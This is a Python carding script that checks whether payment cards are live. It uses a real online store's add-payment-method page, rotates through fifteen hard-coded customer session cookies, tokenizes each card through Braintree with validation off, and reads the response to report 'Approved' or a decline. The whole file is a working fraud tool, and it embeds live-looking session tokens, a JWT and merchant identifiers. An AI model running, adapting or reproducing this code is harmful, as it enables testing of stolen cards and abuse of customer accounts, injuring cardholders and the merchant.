import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
  import requests
  ccx = ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:  # Mo3gza
    yy = yy.split("20")[1]
  with open('fileb3.txt', 'r') as file:
    first_line = file.readline()
  while True:
    lines = '''graymiran%7C1724561971%7CXIAcUQBkZYdmNeq8WTkQTNSyvd7fkwMievCspe5IztU%7C08a418f0892f328a9c6d3559d6fa22988fe0b2657f7cd47ebbb5b85695edd04c
flash777%7C1724983754%7Cd37RckfDuShtnE2XxcExg5zszlicsPe9h2w8rYwiLbr%7C7e6be59de522c64add025796d267a1421297bfdc4e703157cc14e5e0afb2c8bf
l78982%7C1724984225%7C9bLNvQBcuKVuLWz4yEkZ4uk0z8PDSFktUY0CsF5IzfJ%7Cfdac9d7b973976bd488c103c0e40da18b0cd72490f5cd5844e16e66836a73d66
flash22%7C1724982588%7CWfxNjjnd6TX2UX5Sj9KeUJHLvRD9A0SGfFsWSYfZy2t%7C7cd4528de016dcea4234f70b55d14462b9f19faca5dfd5a9655b33edcc0347cc
flash555%7C1724983469%7Ct5T9iWcpcBjzme9GgYNP7NwhaNkw31uBvfWyGJgQ3QF%7C7bb1b58bc32cc40434320bfb5bd3bb02b96a7fdf73e855e6fd6087aaa8b7172d
chee2525%7C1724983277%7Cod94hkOfmL2KQmTy5uZjruBPwJ5cnBRUfeOoNLWUf2l%7C9fd7bbdded6698200ce4d6e2f915371b26e583d1f104fc3b680038e0fd45ea6e
flash11%7C1724982276%7CF9mgxTo2Wzp1zmAufyMBAXPkaNr9QN6l5Yp4DUlrpJT%7Cce9f4a784587cb498f37749915432003d416602a967decea43740decb5bdb142
009009%7C1724924535%7Cuew8rn4JQAkXECKnmtJLk59iOmgVAOUXUIlYBAGA65b%7C0aa5a88e9f95e5f888455860919776c70cedc7fd1efebf8a20f69ff1eba1c8a5
new2222%7C1724672159%7CBnhSpgKTvmRBdMFTOmIw07ebN0iARn86wBNff5L5Sqg%7C9e8c700280d518fa07d6d7f93b7c46962183dd512912c208f6311eeb0969bc5f
65jaki26%7C1725852068%7CnZaGPxN9dQJ5jKDXVjgbHz38tBlq61dd17zgsmHTNSf%7C2bb1bb6f0ae53e78a171d8e4cd53ce7c4bc916a89627dc1ea87c480fce0558fc
jhony78272%7C1725852255%7C2wleoOOpZ4TRlL25gdMfLA7r2jm652XODfhGrALC6Fm%7Cd610335b0cb1d06f18a22401e60542dd44df98c54e722b896efe68ff36b5e554
herng0282%7C1725852421%7CKy783hRAd8sM2rRvK319Smq21osXZsOlDOpA2iGAPkW%7C8378f78763365d0369ce49761aad04e53ec00e67b1d47c16164530bc885b96f2
72672andy%7C1725852574%7CH2edKCIp6XAYYw0IY3sHomP0vhSCWRcmDvwldKclrKa%7C118e2f4420bc03ee06638b8d529a306ff6d11dd859bdb6c1bcdd785c47247793
andye5277%7C1725852765%7CKbqG4m0ilDr1pxNX1ODFupmTf5fSWo8KusKXBdy9Qts%7C229f598778e72afdcac988bf852d1bbe18e089270f2ec708e5b13c74be7fd50c
90188cheetah%7C1725853046%7CZNms2M5gI3xmkea8DmHRYpI1WaEPuzwqSMQ33LmksZt%7Cbe4c144ef06403881bfa8d0ebbee71b7636357b9f763e045cc7a768be2c8b4ec'''
    lines = lines.strip().split('\n')
    random_line_number = random.randint(0, len(lines) - 1)
    big = lines[random_line_number]
    if big == first_line:
      pass
    else:
      break
  with open('fileb3.txt', 'w') as file:
    file.write(big)
  cookies = {
    '__wpdm_client': 'c5941813aa8bc6f6c6ffcad4aec421e6',
    '_ga': 'GA1.1.1298309649.1722425014',
    'soundestID': '20240731112334-P8396eD7ZUN7vx0Bwm1FFWbTsbLBTe4alhnaFgKrnfSvV2qJT',
    'omnisendSessionID': 'fN7Cb7SsBtfqCB-20240731112334',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-31%2010%3A53%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-31%2010%3A53%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_clck': 'bfcojk%7C2%7Cfnx%7C0%7C1673',
    'omnisendContactID': '66aa19f17dab0b8ca2de6957',
    '_gcl_au': '1.1.1823825166.1722425014.909779242.1722425025.1722425074',
    'wordpress_logged_in_f3d6afca09e000de3605ba3b75a59c28': big,
    'fp_logged_in_roles': 'customer',
    'wfwaf-authcookie-f49dbfd669ccc740397dcf7bdaf837d1': '1647%7Cother%7Cread%7C23a340195322255e3298619a9878284896e0004aa890c9c0e43b1a4ac80c6c96',
    'tk_ai': 'A4Gd1wmDIDAhI1ffjmvtAMIV',
    'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fpayment-methods%2F',
    '_ga_DQ29W22D22': 'GS1.1.1722425014.1.1.1722425100.34.0.0',
    '_uetsid': '53321ca04f2f11ef9d36c7a0343b9e58',
    '_uetvid': '5332dab04f2f11ef84efc3c323442f6c',
    'tk_qs': '',
    'page-views': '3',
    '_clsk': 'hchw2l%7C1722425101539%7C3%7C1%7Cz.clarity.ms%2Fcollect',
  }

  headers = {
    'authority': 'www.camius.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': '__wpdm_client=c5941813aa8bc6f6c6ffcad4aec421e6; _ga=GA1.1.1298309649.1722425014; soundestID=20240731112334-P8396eD7ZUN7vx0Bwm1FFWbTsbLBTe4alhnaFgKrnfSvV2qJT; omnisendSessionID=fN7Cb7SsBtfqCB-20240731112334; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-31%2010%3A53%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-31%2010%3A53%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _clck=bfcojk%7C2%7Cfnx%7C0%7C1673; omnisendContactID=66aa19f17dab0b8ca2de6957; _gcl_au=1.1.1823825166.1722425014.909779242.1722425025.1722425074; wordpress_logged_in_f3d6afca09e000de3605ba3b75a59c28=hitlerpapa12%7C1723634676%7C7LwuTmzr1JchHE7RJHYbiHmxFuwgyCu0MwUTsDWGE6n%7Cec7ee1820e0a0fdc66fbd9493e18df6c4ab27d0a58ac858856f9f06ce04357ed; fp_logged_in_roles=customer; wfwaf-authcookie-f49dbfd669ccc740397dcf7bdaf837d1=1647%7Cother%7Cread%7C23a340195322255e3298619a9878284896e0004aa890c9c0e43b1a4ac80c6c96; tk_ai=A4Gd1wmDIDAhI1ffjmvtAMIV; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fpayment-methods%2F; _ga_DQ29W22D22=GS1.1.1722425014.1.1.1722425100.34.0.0; _uetsid=53321ca04f2f11ef9d36c7a0343b9e58; _uetvid=5332dab04f2f11ef84efc3c323442f6c; tk_qs=; page-views=3; _clsk=hchw2l%7C1722425101539%7C3%7C1%7Cz.clarity.ms%2Fcollect',
    'referer': 'https://www.camius.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
  }

  response = requests.get('https://www.camius.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
  add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
  enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
  dec = base64.b64decode(enc).decode('utf-8')
  au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]

  headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'clientSdkMetadata': {
      'source': 'client',
      'integration': 'custom',
      'sessionId': 'd86da7ea-ce23-4293-b2bc-45ba3cfb5c5d',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
      'input': {
        'creditCard': {
          'number': n,
          'expirationMonth': mm,
          'expirationYear': yy,
          'cvv': cvc,
          'billingAddress': {
            'postalCode': '10080',
            'streetAddress': 'Street 13',
          },
        },
        'options': {
          'validate': False,
        },
      },
    },
    'operationName': 'TokenizeCreditCard',
  }

  response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
  tok = response.json()['data']['tokenizeCreditCard']['token']

  cookies = {
    '__wpdm_client': 'c5941813aa8bc6f6c6ffcad4aec421e6',
    '_ga': 'GA1.1.1298309649.1722425014',
    'soundestID': '20240731112334-P8396eD7ZUN7vx0Bwm1FFWbTsbLBTe4alhnaFgKrnfSvV2qJT',
    'omnisendSessionID': 'fN7Cb7SsBtfqCB-20240731112334',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-31%2010%3A53%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-31%2010%3A53%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_clck': 'bfcojk%7C2%7Cfnx%7C0%7C1673',
    'omnisendContactID': '66aa19f17dab0b8ca2de6957',
    '_gcl_au': '1.1.1823825166.1722425014.909779242.1722425025.1722425074',
    'wordpress_logged_in_f3d6afca09e000de3605ba3b75a59c28': big,
    'fp_logged_in_roles': 'customer',
    'wfwaf-authcookie-f49dbfd669ccc740397dcf7bdaf837d1': '1647%7Cother%7Cread%7C23a340195322255e3298619a9878284896e0004aa890c9c0e43b1a4ac80c6c96',
    'tk_ai': 'A4Gd1wmDIDAhI1ffjmvtAMIV',
    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F',
    '_uetsid': '53321ca04f2f11ef9d36c7a0343b9e58',
    '_uetvid': '5332dab04f2f11ef84efc3c323442f6c',
    'tk_qs': '',
    'page-views': '5',
    '_clsk': 'hchw2l%7C1722425366040%7C5%7C1%7Cz.clarity.ms%2Fcollect',
    '_ga_DQ29W22D22': 'GS1.1.1722425014.1.1.1722425479.60.0.0',
  }

  headers = {
    'authority': 'www.camius.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '__wpdm_client=c5941813aa8bc6f6c6ffcad4aec421e6; _ga=GA1.1.1298309649.1722425014; soundestID=20240731112334-P8396eD7ZUN7vx0Bwm1FFWbTsbLBTe4alhnaFgKrnfSvV2qJT; omnisendSessionID=fN7Cb7SsBtfqCB-20240731112334; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-31%2010%3A53%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-31%2010%3A53%3A34%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _clck=bfcojk%7C2%7Cfnx%7C0%7C1673; omnisendContactID=66aa19f17dab0b8ca2de6957; _gcl_au=1.1.1823825166.1722425014.909779242.1722425025.1722425074; wordpress_logged_in_f3d6afca09e000de3605ba3b75a59c28=hitlerpapa12%7C1723634676%7C7LwuTmzr1JchHE7RJHYbiHmxFuwgyCu0MwUTsDWGE6n%7Cec7ee1820e0a0fdc66fbd9493e18df6c4ab27d0a58ac858856f9f06ce04357ed; fp_logged_in_roles=customer; wfwaf-authcookie-f49dbfd669ccc740397dcf7bdaf837d1=1647%7Cother%7Cread%7C23a340195322255e3298619a9878284896e0004aa890c9c0e43b1a4ac80c6c96; tk_ai=A4Gd1wmDIDAhI1ffjmvtAMIV; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.camius.com%2Fmy-account%2Fadd-payment-method%2F; _uetsid=53321ca04f2f11ef9d36c7a0343b9e58; _uetvid=5332dab04f2f11ef84efc3c323442f6c; tk_qs=; page-views=5; _clsk=hchw2l%7C1722425366040%7C5%7C1%7Cz.clarity.ms%2Fcollect; _ga_DQ29W22D22=GS1.1.1722425014.1.1.1722425479.60.0.0',
    'origin': 'https://www.camius.com',
    'referer': 'https://www.camius.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
  }

  data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"79dfb3029750ac68f2869a01baf29be9","fraud_merchant_id":null,"correlation_id":"a622dab1adf0e57dad5e4090350fa260"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/3j685wjt88rnyb4b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/3j685wjt88rnyb4b"},"merchantId":"3j685wjt88rnyb4b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJlYmVhMzdjYy1iMzBjLTQ3ZGItYThlYS1hZDZmNGM0MmY1MWEiLCJpYXQiOjE3MjI0MjUzNjEsImV4cCI6MTcyMjQzMjU2MSwiaXNzIjoiNjVhOTEzMDYwOGJjMDI3ZjBlNmRlNjllIiwiT3JnVW5pdElkIjoiNjVhNmVmMzEwOGJjMDI3ZjBlNmRlMmU5In0.y-OyCLfbELRbQ0W8-W2mucXEE-DrQhBTaNLy78NBuqA"},"paypalEnabled":true,"paypal":{"displayName":"Camius","clientId":"AeMlQfFgOlM7YFsp1tSNXTT8tTnThQ25BwQKWWr-QR_8lHXYako3E9iXuAKbmv0Kb1uAxpET3d6kK3Zx","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"MaxcomInternational_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
  }

  response = requests.post('https://www.camius.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
  text = response.text
  pattern = r'Reason: (.+?)\s*</li>'
  match = re.search(pattern, text)
  if match:
    result = match.group(1)
  else:
    if 'Payment method successfully added.' in text:
      result = "1000: Approved"
    elif 'risk_threshold' in text:
      result = "Gateway Rejected: Risk Threshold"
    elif 'Please wait for 20 seconds.' in text:      
      result = "try again"
    else:
      result = "Declined"
      print('er#')
  if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'invaild postal code' in result:
     return 'Approved'
  else:
     return result
def sq(card):
   return '@Cheetax1'
